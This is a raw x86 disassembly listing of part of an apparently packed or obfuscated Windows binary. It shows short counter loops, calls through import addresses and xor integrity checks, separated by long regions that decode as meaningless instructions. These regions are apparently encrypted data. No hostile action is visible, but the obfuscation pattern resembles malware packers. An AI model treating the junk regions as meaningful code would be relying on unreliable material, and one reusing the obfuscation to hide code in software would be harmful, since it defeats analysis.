  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x137a30b
  4095d3:	xor    DWORD PTR [ecx+ebx*8+0x7e],ebp
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x409562
  4095dd:	ret    
  4095de:	add    DWORD PTR [esp+ebx*4+0x156596ef],esp
  4095e5:	xchg   ecx,eax
  4095e6:	test   al,0x16
  4095e8:	push   eax
  4095e9:	mov    bl,0xe5
  4095eb:	(bad)  
  4095ec:	fistp  DWORD PTR [eax]
  4095ee:	int3   
  4095ef:	test   eax,0xedf09b7a
  4095f4:	sbb    BYTE PTR [ecx+0x4b],dl
  4095f7:	shr    DWORD PTR [eax-0x4f],0xb5
  4095fb:	push   esp
  4095fc:	add    esi,DWORD PTR ds:0x2b19051a
  409602:	mov    ds:0x967a7659,al
  409607:	sahf   
  409608:	div    DWORD PTR [esi+0x39]
  40960b:	jno    0x409669
  40960d:	push   esi
  40960e:	pusha  
  40960f:	movntps XMMWORD PTR [esi+edx*8],xmm4
  409613:	push   es
  409614:	xor    DWORD PTR [edi-0x21],0xe94cfb13
  40961b:	rcl    BYTE PTR es:[edx],0xae
  40961f:	dec    eax
  409620:	retf   
  409621:	ret    0xbb8c
  409624:	xchg   edx,eax
  409625:	jle    0x4095c8
  409627:	retf   0xb101
  40962a:	jmp    0x59487226
  40962f:	push   eax
  409630:	loope  0x4095e0
  409632:	adc    dl,bh
  409634:	mov    al,0x8d
  409636:	pop    esi
  409637:	jl     0x40969e
  409639:	dec    edx
  40963a:	mov    bh,0xc5
  40963c:	mov    dh,0x84
  40963e:	mov    esi,0x4ef61d88
  409643:	ror    DWORD PTR [edx+0xd1c6d],1
  409649:	rol    DWORD PTR [ebx],cl
  40964b:	lahf   
  40964c:	mov    ebp,0x4e041fba
  409651:	int3   
  409652:	in     eax,0xeb
  409654:	inc    esi
  409655:	adc    DWORD PTR [ebx],esp
  409657:	push   0x7f2cf15b
  40965c:	cmp    al,0xc2
  40965e:	xchg   edx,eax
  40965f:	push   0xffffffea
  409661:	and    eax,0x3b807d23
  409666:	jae    0x40965e
  409668:	push   ebx
  409669:	test   al,0x5c
  40966b:	jno    0x4096cb
  40966d:	fbld   TBYTE PTR [edi]
  40966f:	adc    BYTE PTR [eax],0x2e
  409672:	pop    edi
  409673:	repnz cmp al,0xde
  409676:	mov    BYTE PTR [esi-0x3],dl
  409679:	or     dh,bh
  40967b:	sub    bh,BYTE PTR [ebx-0x7d]
  40967e:	pop    ss
  40967f:	addr16 push ebp
  409681:	loopne 0x40961b
  409683:	(bad)  
  409684:	call   0xe39808a9
  409689:	(bad)  
  40968a:	in     al,dx
  40968b:	xor    eax,DWORD PTR [ebp+0x68]
  40968e:	xor    DWORD PTR [edi-0x7d],ebx
  409691:	add    eax,edi
  409693:	pop    eax
  409694:	cmp    dl,ah
  409696:	cdq    
  409697:	jle    0x40967b
  409699:	mov    esi,0x3ac39166
  40969e:	mov    dl,0xaf
  4096a0:	adc    ch,BYTE PTR [ecx+0x266ab97]
  4096a6:	(bad)
  4096aa:	adc    esi,DWORD PTR [eax+0x6f074ce3]
  4096b0:	jno    0x409692
  4096b2:	(bad)  
  4096b3:	(bad)  [esi]
  4096b5:	(bad)  
  4096b6:	adc    ch,BYTE PTR ds:0xc63ca399
  4096bc:	xor    cl,dh
  4096be:	mov    dl,0x8
  4096c0:	out    0x9b,eax
  4096c2:	imul   eax,DWORD PTR [eax+0x3d],0xffffff9c
  4096c6:	push   esi
  4096c7:	imul   eax,DWORD PTR fs:[esi-0x3f],0xffffffbc
  4096cc:	dec    eax
  4096cd:	sbb    ecx,edi
  4096cf:	add    DWORD PTR [edx+eax*2],esi
  4096d2:	rcr    DWORD PTR [edi],1
  4096d4:	dec    edx
  4096d5:	aad    0x90
  4096d7:	outs   dx,BYTE PTR ds:[esi]
  4096d8:	push   es
  4096d9:	sar    BYTE PTR [ebx],cl
  4096db:	pop    ebp
  4096dc:	add    eax,DWORD PTR [edi+ebp*4-0x664e06dd]
  4096e3:	ins    BYTE PTR es:[edi],dx
  4096e4:	stos   DWORD PTR es:[edi],eax
  4096e5:	and    eax,0xef594de2
  4096ea:	mov    eax,ds:0xb987d254
  4096ef:	pop    ecx
  4096f0:	or     eax,DWORD PTR [eax+ebx*2-0x7ca8730e]
  4096f7:	or     bl,bh
  4096f9:	rol    BYTE PTR [eax+0x73],1
  4096fc:	fcomp  QWORD PTR [edi-0x44bd3a8b]
  409702:	inc    ebp
  409703:	(bad)  [ecx-0xa]
  409706:	sub    eax,0x7b7067c9
  40970b:	add    al,0xa6
  40970d:	push   ds
  40970e:	jge    0x409789
  409710:	pop    ecx
  409711:	jne    0x4096d0
  409713:	imul   ecx,edx,0x9
  409716:	push   ss
  409717:	std    
  409718:	test   ah,al
  40971a:	jecxz  0x40973c
  40971c:	mov    esp,0x93aa88db
  409721:	sbb    eax,0xe8e47928
  409726:	push   eax
  409727:	push   cs
  409728:	pusha  
  409729:	inc    esi
  40972a:	sub    BYTE PTR [ebx],0x1
  40972d:	mov    ecx,0xc55aee3b
  409732:	xchg   DWORD PTR [ecx+edi*8+0x59a7c789],esi
  409739:	repz mov al,0x51
  40973c:	mov    ecx,0x9b4641d7
  409741:	mov    edi,0xbeb94d2b
  409746:	adc    BYTE PTR [edi],bl
  409748:	push   edx
  409749:	repz xor eax,0xf9e54e2f
  40974f:	cmp    ebp,DWORD PTR [eax]
  409751:	xchg   ebp,eax
  409752:	jnp    0x4096ed
  409754:	clc    
  409755:	in     eax,0xba
  409757:	inc    ebx
  409758:	jp     0x409762
  40975a:	sub    sp,ax
  40975d:	shl    DWORD PTR [ecx-0x1aa65ec4],cl
  409763:	dec    eax
  409764:	(bad)  
  409765:	xor    eax,0x346f46d6
  40976a:	pop    esp
  40976b:	xchg   DWORD PTR [eax-0x5a6881f6],esi
  409771:	scas   eax,DWORD PTR es:[edi]
  409772:	out    0x33,eax
  409774:	pusha  
  409775:	adc    dl,BYTE PTR [ebp-0x7bfef223]
  40977b:	pop    ebx
  40977c:	or     al,0x32
  40977e:	test   eax,0xe3d7f371
  409783:	(bad)  
  409785:	out    0xa5,al
  409787:	cli    
  409788:	mov    ch,0xbf
  40978a:	push   edx
  40978b:	pop    ecx
  40978c:	shr    BYTE PTR [ecx+0x245170fd],1
  409792:	in     al,0x4
  409794:	cmp    BYTE PTR [ecx-0x4f],ah
  409797:	mov    bh,0xdb
  409799:	xor    ebp,0xffffffe3
  40979c:	dec    ecx
  40979d:	jmp    0xd61a633c
  4097a2:	mov    edi,0xb0e34afa
  4097a7:	div    DWORD PTR [edx-0xf0ee3d9]
  4097ad:	xchg   esi,eax
  4097ae:	add    al,0xc9
  4097b0:	fwait
  4097b1:	in     al,dx
  4097b2:	inc    esi
  4097b3:	outs   dx,DWORD PTR ds:[esi]
  4097b4:	add    al,0x27
  4097b6:	inc    ecx
  4097b7:	ds pop ebp
  4097b9:	fbstp  TBYTE PTR [ebp+ebx*8-0x16]
  4097bd:	arpl   cx,dx
  4097bf:	in     al,0x1c
  4097c1:	imul   ebp,esp,0x7f834b97
  4097c7:	loope  0x4097c3
  4097c9:	lock lahf 
  4097cb:	xchg   esi,eax
  4097cc:	adc    al,al
  4097ce:	jmp    0xca707108
  4097d3:	sub    al,0x3b
  4097d5:	jb     0x409778
  4097d7:	aaa    
  4097d8:	jl     0x409801
  4097da:	ret    0xc971
  4097dd:	fs sub eax,0xf494fe9a
  4097e3:	call   0x1b5b3034
  4097e8:	cmp    esi,esi
  4097ea:	fld    TBYTE PTR [esi]
  4097ec:	adc    edi,esp
  4097ee:	and    al,0x5b
  4097f0:	pop    esp
  4097f1:	ret    0xc247
  4097f4:	pop    ebx
  4097f5:	and    cl,BYTE PTR ds:0xad0e482
  4097fb:	sbb    eax,0x1dd60c14
  409800:	jl     0x409834
  409802:	pop    edi
  409803:	imul   esi,DWORD PTR [ebx+0x59],0x25
  409807:	pop    ebx
  409808:	lahf   
  409809:	mov    WORD PTR [edi+0x150c53cf],ss
  40980f:	out    dx,eax
  409810:	adc    BYTE PTR [ebp+0x49],ah
  409813:	mov    ebp,0xefdd9e38
  409818:	test   al,0x91
  40981a:	stos   BYTE PTR es:[edi],al
  40981b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40981d:	fucom  st(4)
  40981f:	das    
  409820:	fdivr  DWORD PTR [eax]
  409822:	sbb    DWORD PTR [edx],0x2a313a4a
  409828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409829:	cs nop
  40982b:	(bad)  
  40982c:	adc    DWORD PTR ds:0x7146cccb,esi
  409832:	aas    
  409833:	jbe    0x40985f
  409835:	dec    edx
  409836:	dec    edx
  409837:	clc    
  409838:	pop    es
  409839:	push   ss
  40983a:	add    ah,BYTE PTR gs:[edi]
  40983d:	std    
  40983e:	(bad)  
  40983f:	aad    0x80
  409841:	mov    dl,0x4c
  409843:	mov    dl,0x9
  409845:	and    DWORD PTR [ecx+0x321f3aec],ebp
  40984b:	sub    ecx,DWORD PTR [ecx]
  40984d:	mov    cs,WORD PTR [ecx-0x5]
  409850:	add    bl,BYTE PTR [edx]
  409852:	test   ecx,esi
  409854:	(bad)  
  409855:	sbb    eax,0xb1b91f2b
  40985a:	pushf  
  40985b:	int    0xf
  40985d:	(bad)  
  40985e:	outs   dx,DWORD PTR ds:[esi]
  40985f:	dec    esp
  409860:	ds xor edx,ebp
  409863:	sbb    ebx,eax
  409865:	push   ss
  409866:	sbb    bh,BYTE PTR [ebx]
  409868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409869:	inc    ebx
  40986a:	paddsb mm2,QWORD PTR [eax]
  40986d:	cmc    
  40986e:	dec    ebx
  40986f:	outs   dx,BYTE PTR ds:[esi]
  409870:	xchg   esp,eax
  409871:	cmp    ah,BYTE PTR ds:0x3278fb19
  409877:	out    0xb9,eax
  409879:	push   ebx
  40987a:	cmp    eax,DWORD PTR [esi+esi*8-0x45044b2f]
  409881:	daa    
  409882:	test   al,dl
  409884:	dec    ebp
  409885:	ds jb  0x409883
  409888:	in     eax,0xf6
  40988a:	lds    ecx,FWORD PTR [ecx+eiz*8+0x2ac9a1f3]
  409891:	xor    ebp,0xe620e456
  409897:	not    bl
  409899:	test   eax,0x13d64115
  40989e:	jl     0x409846
  4098a0:	xchg   DWORD PTR [ecx],eax
  4098a2:	leave  
  4098a3:	je     0x4098de
  4098a5:	push   0x591c8673
  4098aa:	or     bh,BYTE PTR [eax-0x47]
  4098ad:	adc    bl,dh
  4098af:	mov    ds:0x8b38ce8b,eax
  4098b4:	cdq    
  4098b5:	(bad)  
  4098b6:	jmp    0x7668:0x27157b1b
  4098bd:	jmp    0x94ddae83
  4098c2:	pop    ss
  4098c3:	pop    ebx
  4098c4:	jb     0x409935
  4098c6:	out    dx,al
  4098c7:	fs lahf 
  4098c9:	xor    al,0xa4
  4098cb:	jno    0x40994c
  4098cd:	xchg   edx,eax
  4098ce:	cmp    eax,0x46607e0f
  4098d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098d4:	and    DWORD PTR [edi],eax
  4098d6:	sub    ecx,ebp
  4098d8:	ss in  al,0x4c
  4098db:	inc    esi
  4098dc:	mov    ebx,0xf7df162
  4098e1:	mov    bh,0xc9
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fst    QWORD PTR [edi-0x5b]
  4099bf:	adc    esp,DWORD PTR [ebx]
  4099c1:	push   0x7a7e7ee4
  4099c6:	jge    0x409a46
  4099c8:	jle    0x409a3b
  4099ca:	or     eax,0xed25c622
  4099cf:	aad    0x0
  4099d1:	imul   ebx,edi,0x27
  4099d4:	in     al,0x74
  4099d6:	rcl    DWORD PTR [esi+0x3e854b94],0xd6
  4099dd:	xor    bl,BYTE PTR [edi-0x74d57d51]
  4099e3:	sahf   
  4099e4:	and    ch,ch
  4099e6:	pushf  
  4099e7:	outs   dx,DWORD PTR ds:[esi]
  4099e8:	icebp  
  4099e9:	push   ecx
  4099ea:	mov    WORD PTR [eax+0x7f],ds
  4099ed:	nop
  4099ee:	mov    ebp,0xd3b035bb
  4099f3:	leave  
  4099f4:	mul    ah
  4099f6:	xor    al,0xbc
  4099f8:	pop    ds
  4099f9:	ret    
  4099fa:	ficom  DWORD PTR [ebp+edi*1+0x3945dee7]
  409a01:	jb     0x4099d9
  409a03:	lods   al,BYTE PTR ds:[esi]
  409a04:	jmp    0x7585:0x1736c340
  409a0b:	ffreep st(1)
  409a0d:	outs   dx,BYTE PTR ds:[esi]
  409a0e:	out    0x63,eax
  409a10:	jecxz  0x409a36
  409a12:	jb     0x4099d3
  409a14:	add    eax,0xbd74b042
  409a19:	jmp    0xfe8d:0x5d3131e1
  409a20:	popa   
  409a21:	inc    ebx
  409a22:	scas   al,BYTE PTR es:[edi]
  409a23:	dec    ecx
  409a24:	inc    edi
  409a25:	mov    ebx,0xb79d6212
  409a2a:	xchg   edx,eax
  409a2b:	call   0xea7f:0xb5bb203a
  409a32:	xchg   ecx,eax
  409a33:	test   BYTE PTR [eax+0x1b],ah
  409a36:	pop    edi
  409a37:	dec    ecx
  409a38:	push   esp
  409a39:	ds mov ecx,0x9270d2f0
  409a3f:	hlt    
  409a40:	xor    DWORD PTR [esi-0x73],ebx
  409a43:	sub    eax,0xa62b6873
  409a48:	and    DWORD PTR [ebx],ebp
  409a4a:	adc    BYTE PTR [esi+0x57],0x25
  409a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a4f:	mul    DWORD PTR [eax+0x8]
  409a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a53:	xchg   edi,eax
  409a54:	xor    edi,0x3bddfdb4
  409a5a:	lods   eax,DWORD PTR ds:[esi]
  409a5b:	sub    ch,BYTE PTR [ebp+0x13f2d717]
  409a61:	push   edx
  409a62:	into   
  409a63:	jns    0x409a98
  409a65:	hlt    
  409a66:	icebp  
  409a67:	cmp    eax,0x4224344e
  409a6c:	dec    edx
  409a6d:	pop    eax
  409a6e:	in     eax,0xe3
  409a70:	int3   
  409a71:	ret    
  409a72:	push   ss
  409a73:	xchg   esi,eax
  409a74:	cld    
  409a75:	ss mov eax,0x7617e452
  409a7b:	jmp    0x524d5be7
  409a80:	pusha  
  409a81:	xor    BYTE PTR [eax+0x3a57b582],dl
  409a87:	fs enter 0x684a,0xa1
  409a8c:	cmp    ecx,ebx
  409a8e:	xor    al,0x4
  409a90:	or     dh,BYTE PTR [eax]
  409a92:	imul   edi,esp,0xffffffe9
  409a95:	inc    esi
  409a96:	inc    BYTE PTR [ecx+0x76]
  409a99:	enter  0x8fc7,0x54
  409a9d:	inc    ebx
  409a9e:	leave  
  409a9f:	inc    ecx
  409aa0:	sbb    DWORD PTR [ecx],ebp
  409aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aa3:	sbb    bl,BYTE PTR [esi+eax*4]
  409aa6:	cmp    edi,DWORD PTR [ebp+0x59de206b]
  409aac:	out    dx,eax
  409aad:	lock mov gs,WORD PTR [edi-0x6f6da8e1]
  409ab4:	mov    es,WORD PTR [ebx-0x20b2c839]
  409aba:	test   BYTE PTR [eax],bl
  409abc:	imul   BYTE PTR [edx+eiz*1]
  409abf:	or     dl,BYTE PTR [ecx-0x136c5283]
  409ac5:	pop    edx
  409ac6:	scas   al,BYTE PTR es:[edi]
  409ac7:	sub    DWORD PTR [esi],eax
  409ac9:	div    BYTE PTR ds:0xc3e683bc
  409acf:	out    dx,al
  409ad0:	pop    ebp
  409ad1:	mov    ebx,0x4ed8ce72
  409ad6:	pushf  
  409ad7:	data16 test BYTE PTR [ebx],dl
  409ada:	jo     0x409ac2
  409adc:	cmp    ebx,edi
  409ade:	xor    BYTE PTR [edx*4+0x183234a],ch
  409ae5:	inc    edi
  409ae6:	mov    ebp,fs
  409ae8:	jp     0x409af2
  409aea:	jecxz  0x409a85
  409aec:	jns    0x409ab2
  409aee:	xor    eax,0x4e87e23e
  409af3:	call   0x81004928
  409af8:	xchg   edi,eax
  409af9:	leave  
  409afa:	retf   
  409afb:	cmp    DWORD PTR [esi-0x18],ecx
  409afe:	and    al,0x70
  409b00:	cmp    cl,cl
  409b02:	xor    DWORD PTR [ebx],edi
  409b04:	jg     0x409a9e
  409b06:	enter  0x249d,0xe7
  409b0a:	mov    ebp,esp
  409b0c:	test   DWORD PTR [ebp+esi*2+0x6a38f99e],0xeb58cf7d
  409b17:	and    eax,DWORD PTR [esp+ebp*2]
  409b1a:	retf   
  409b1b:	out    dx,al
  409b1c:	shl    DWORD PTR [ebp-0x42],cl
  409b1f:	neg    BYTE PTR [eax]
  409b21:	fst    QWORD PTR [edx+0x0]
  409b24:	out    0xdd,eax
  409b26:	dec    eax
  409b27:	fistp  DWORD PTR ds:0xb6449a4
  409b2d:	ja     0x409adb
  409b2f:	ins    DWORD PTR es:[edi],dx
  409b30:	xchg   ebx,eax
  409b31:	cmp    BYTE PTR [ecx],dl
  409b33:	mov    dh,0x23
  409b35:	outs   dx,DWORD PTR ds:[esi]
  409b36:	mov    cl,0xdc
  409b38:	(bad)  
  409b39:	sub    eax,0x78fd8a6
  409b3e:	inc    edi
  409b3f:	out    dx,al
  409b40:	fs cld 
  409b42:	mov    esi,0xf08d3487
  409b47:	lahf   
  409b48:	(bad)  
  409b49:	xor    DWORD PTR [ebx],eax
  409b4b:	pop    ebp
  409b4c:	in     al,0xe2
  409b4e:	sbb    eax,0x28970e16
  409b53:	xor    bh,BYTE PTR [ecx]
  409b55:	dec    ebx
  409b56:	cmp    eax,0x7473c3ab
  409b5b:	popa   
  409b5c:	inc    esi
  409b5d:	push   edi
  409b5e:	fnstenv [esi+0x6f046e20]
  409b64:	das    
  409b65:	push   edx
  409b66:	pop    ebp
  409b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b68:	imul   esi,DWORD PTR [ecx-0x6b215f38],0x30
  409b6f:	jo     0x409afb
  409b71:	push   ebp
  409b72:	mov    DWORD PTR ds:0x2d03c0dc,0xbc4f2eaa
  409b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b7d:	fnstenv [edi-0x46]
  409b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b81:	(bad)  
  409b82:	enter  0x9abd,0xa8
  409b86:	jbe    0x409b23
  409b88:	xchg   BYTE PTR [edx+ebx*2-0x330023e8],ah
  409b8f:	or     al,0x99
  409b91:	cmc    
  409b92:	mov    cs:0xc3cc17ca,eax
  409b98:	jae    0x409c15
  409b9a:	cdq    
  409b9b:	xchg   ecx,eax
  409b9c:	mov    ds:0xe33f46f1,eax
  409ba1:	int3   
  409ba2:	loopne 0x409b65
  409ba4:	xchg   esp,eax
  409ba5:	pop    ebp
  409ba6:	and    DWORD PTR [ecx+0x2d],0x45
  409baa:	inc    esi
  409bab:	mov    cl,0x72
  409bad:	fmul   DWORD PTR [ebp+0x2]
  409bb0:	jae    0x409be9
  409bb2:	inc    ebx
  409bb3:	push   ecx
  409bb4:	jb     0x409bfd
  409bb6:	cmp    BYTE PTR [eax+0x12],bh
  409bb9:	mov    ch,0x1a
  409bbb:	sbb    BYTE PTR [edi],dh
  409bbd:	cdq    
  409bbe:	dec    edx
  409bbf:	add    BYTE PTR [esi],ch
  409bc1:	scas   al,BYTE PTR es:[edi]
  409bc2:	mov    WORD PTR [ebx+0x24a923a1],fs
  409bc8:	mov    dh,ch
  409bca:	nop
  409bcb:	push   eax
  409bcc:	jae    0x409c40
  409bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bcf:	pop    es
  409bd0:	and    edi,DWORD PTR [eax]
  409bd2:	or     cl,BYTE PTR [ebx-0x7c92b94e]
  409bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd9:	lea    ecx,[esi+0x434aafd3]
  409bdf:	mov    WORD PTR [edx],?
  409be1:	syscall 
  409be3:	adc    eax,0x5bbafec3
  409be8:	loop   0x409bb4
  409bea:	add    BYTE PTR [ecx],ah
  409bec:	lahf   
  409bed:	nop
  409bee:	mov    dh,0x49
  409bf0:	lock cmp eax,DWORD PTR [edx+0x3529c557]
  409bf7:	cmp    BYTE PTR [esi],bl
  409bf9:	loope  0x409c6b
  409bfb:	inc    ecx
  409bfc:	inc    eax
  409bfd:	ds jne 0x409bf0
  409c00:	(bad)  
  409c01:	adc    BYTE PTR [edx-0x6103a17f],ah
  409c07:	xchg   ecx,eax
  409c08:	call   0xdfb0:0x21d0a9c2
  409c0f:	adc    DWORD PTR [esi+0x8866653],edx
  409c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c16:	jnp    0x409be2
  409c18:	ds daa 
  409c1a:	shl    BYTE PTR [ebp-0x38b52806],cl
  409c20:	inc    edi
  409c21:	in     eax,dx
  409c22:	push   cs
  409c23:	pusha  
  409c24:	and    dl,dh
  409c26:	jg     0x409c3e
  409c28:	enter  0x6811,0xb1
  409c2c:	push   es
  409c2d:	mov    DWORD PTR [ebx+0x39acb0f4],eax
  409c33:	rcr    edx,cl
  409c35:	lds    edi,FWORD PTR [ebx]
  409c37:	jo     0x409c98
  409c39:	outs   dx,BYTE PTR ds:[esi]
  409c3a:	cli    
  409c3b:	fimul  WORD PTR [esi-0x6b]
  409c3e:	xchg   BYTE PTR [edx+0x4d],al
  409c41:	and    eax,0xe252e74f
  409c46:	push   ss
  409c47:	std    
  409c48:	arpl   WORD PTR ds:0x2b8b6d63,dx
  409c4e:	pop    es
  409c4f:	cmp    DWORD PTR [eax],edx
  409c51:	lea    esp,[edx-0x6a9c8129]
  409c57:	dec    cl
  409c59:	add    DWORD PTR [esi+0x2d],ebx
  409c5c:	jb     0x409c5c
  409c5e:	ja     0x409bf4
  409c60:	mov    eax,ds:0xc926862
  409c65:	stos   BYTE PTR es:[edi],al
  409c66:	xor    esi,edx
  409c68:	push   ebp
  409c69:	out    0x7d,al
  409c6b:	jno    0x409c9c
  409c6d:	popf   
  409c6e:	jmp    0x8702ed17
  409c73:	cmp    dl,bl
  409c75:	adc    DWORD PTR [edx-0x32],0xfcdb52ca
  409c7c:	mov    DWORD PTR [ebp+0x246ec0e2],eax
  409c82:	jmp    0x409c87
  409c84:	jp     0x409c90
  409c86:	jne    0x409c26
  409c88:	or     al,0x96
  409c8a:	lds    edi,FWORD PTR ds:0x6371d062
  409c90:	ficomp DWORD PTR [edi-0x42]
  409c93:	xor    DWORD PTR [esi+0x45],edx
  409c96:	add    al,BYTE PTR [ebp+0x7c]
  409c99:	push   0xbcb9cdac
  409c9e:	sbb    BYTE PTR [eiz*2-0xe8c6dbe],0xc5
  409ca6:	inc    esp
  409ca7:	aaa    
  409ca8:	jge    0x409c2b
  409caa:	mov    ah,0x79
  409cac:	idiv   BYTE PTR fs:[esi-0x1b]
  409cb0:	popa   
  409cb1:	mov    al,ds:0x8bc6c64d
  409cb6:	cld    
  409cb7:	cli    
  409cb8:	mov    al,ds:0x52f5a27c
  409cbd:	jmp    0xdbd3c544
  409cc2:	sub    eax,0x17efcc6a
  409cc7:	sbb    edi,DWORD PTR gs:[ebx+0xf9806da]
  409cce:	test   esi,eax
  409cd0:	push   es
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	icebp  
  409cfa:	les    eax,FWORD PTR [eax]
  409cfc:	call   0x7d7a:0x7e7ee374
  409d03:	jle    0x409d83
  409d05:	lods   eax,DWORD PTR ds:[esi]
  409d06:	mov    ch,0xb9
  409d08:	ds mov ebp,0xef209ca8
  409d0e:	pop    ss
  409d0f:	ss mov dl,0x16
  409d12:	(bad)  
  409d13:	aas    
  409d14:	pop    eax
  409d15:	fnsave [edx+0x25808c74]
  409d1b:	jnp    0x409d34
  409d1d:	jns    0x409d8c
  409d1f:	shr    DWORD PTR [edx+0x0],1
  409d22:	push   ebx
  409d23:	xor    al,0x24
  409d25:	popa   
  409d26:	cmp    DWORD PTR [ecx-0x11],ecx
  409d29:	cmp    esi,0x728d339d
  409d2f:	popf   
  409d30:	in     eax,0xf0
  409d32:	lahf   
  409d33:	dec    esi
  409d34:	into   
  409d35:	rcl    DWORD PTR [edi-0x7f],1
  409d38:	lmsw   WORD PTR [edx-0x2ca75a66]
  409d3f:	inc    edi
  409d40:	sbb    DWORD PTR ds:0xaed63074,0xd963cc41
  409d4a:	mov    ds:0x9aff7a95,al
  409d4f:	loope  0x409d4a
  409d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d52:	mov    edx,0x22cbaafc
  409d57:	adc    DWORD PTR [eax-0x3208f54c],edx
  409d5d:	aam    0x1b
  409d5f:	mov    al,0x17
  409d61:	(bad)  
  409d62:	sti    
  409d63:	(bad)  
  409d64:	shl    DWORD PTR [ecx],cl
  409d66:	inc    ebp
  409d67:	pop    es
  409d68:	lods   eax,DWORD PTR ds:[esi]
  409d69:	call   0x291d4c61
  409d6e:	sti    
  409d6f:	test   ah,bh
  409d71:	outs   dx,DWORD PTR ds:[esi]
  409d72:	mov    esp,0x3686daa9
  409d77:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409d79:	jb     0x409d06
  409d7b:	dec    esi
  409d7c:	xchg   BYTE PTR [edi-0x5d],ah
  409d7f:	mov    ch,0xad
  409d81:	cmp    al,0xc7
  409d83:	jg     0x409d18
